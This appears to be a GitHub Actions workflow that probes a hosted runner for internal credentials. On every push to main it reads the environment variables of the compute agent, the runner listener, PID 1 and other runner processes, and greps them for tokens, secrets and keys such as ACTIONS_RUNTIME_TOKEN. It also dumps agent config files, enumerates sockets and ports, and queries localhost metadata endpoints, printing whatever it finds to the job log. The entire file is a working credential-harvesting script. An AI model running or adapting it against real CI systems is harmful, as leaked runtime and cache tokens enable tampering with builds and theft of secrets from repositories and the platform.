name: HCAProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: HCA and internal token investigation
        run: |
          echo '=== CURRENT USER ==='
          id
          echo '=== ALL PROCESSES (runner user) ==='
          ps aux | grep -v grep | grep runner | head -20
          echo '=== HCA PROCESS DETAILS ==='
          HCA_PID=$(pgrep -f hosted-compute-agent | head -1)
          echo HCA_PID=$HCA_PID
          if [ -n "$HCA_PID" ]; then
            echo '--- HCA cmdline ---'
            cat /proc/$HCA_PID/cmdline 2>/dev/null | tr '\0' ' '
            echo ''
            echo '--- HCA environ (CRITICAL - looking for ACTIONS_RUNTIME_TOKEN) ---'
            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE|AUTH|BEARER|ACTIONS' | head -30 || echo 'HCA_ENVIRON_READ_FAILED'
            echo '--- HCA ALL environ ---'
            cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -50 || echo 'FAILED'
          fi
          echo '=== RUNNER.LISTENER PID ==='
          RL_PID=$(pgrep -f Runner.Listener | head -1)
          echo RL_PID=$RL_PID
          if [ -n "$RL_PID" ]; then
            echo '--- Listener environ ---'
            cat /proc/$RL_PID/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE' | head -20 || echo 'LISTENER_ENVIRON_FAILED'
          fi
          echo '=== ALL RUNNER PROCS ENVIRON ==='
          for pid in $(pgrep -u runner 2>/dev/null); do
            CMD=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 50)
            ENV_HITS=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|_apis/artifactcache' | head -5)
            if [ -n "$ENV_HITS" ]; then
              echo FOUND IN PID $pid CMD=$CMD:
              echo $ENV_HITS
            fi
          done
          echo '=== OPT HCA DIRECTORY ==='
          ls -laR /opt/hca/ 2>/dev/null | head -30
          echo '=== UNIX SOCKETS HCA ==='
          ss -xlp 2>/dev/null | grep -iE 'hca|runner|action' | head -10 || echo 'no sockets found'
          echo '=== LOCALHOST PORTS ==='
          ss -tlnp 2>/dev/null | head -20
          echo '=== RUNTIME TOKEN VIA HCA SOCKET ==='
          find /run /tmp /var/run -name '*.sock' 2>/dev/null | head -20
          echo '=== PID 1 ENVIRON ==='
          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'TOKEN|SECRET|KEY|RUNTIME|CACHE' | head -20 || echo 'PID1_ENVIRON_FAILED'
          echo '=== HCA CONFIG FILES ==='
          find /opt/hca /etc/hca /home/runner/.hca -type f 2>/dev/null | head -20
          cat /opt/hca/*.json 2>/dev/null || echo 'no json'
          cat /opt/hca/*.conf 2>/dev/null || echo 'no conf'
          echo '=== RUNNER ACTIONS-RUNNER DIR ==='
          ls -la /home/runner/actions-runner/ 2>/dev/null | head -20
          find /home/runner/actions-runner -name '*.json' -not -path '*/cached/*' 2>/dev/null | xargs cat 2>/dev/null | head -50
          echo '=== RUNTIME TOKEN VIA CURL HCA METADATA ==='
          curl -s http://localhost:8080/api/v1/metadata 2>/dev/null | head -5 || echo 'no 8080'
          curl -s http://localhost:9090/api/v1/metadata 2>/dev/null | head -5 || echo 'no 9090'
          curl -s http://localhost:2222/metadata 2>/dev/null | head -5 || echo 'no 2222'
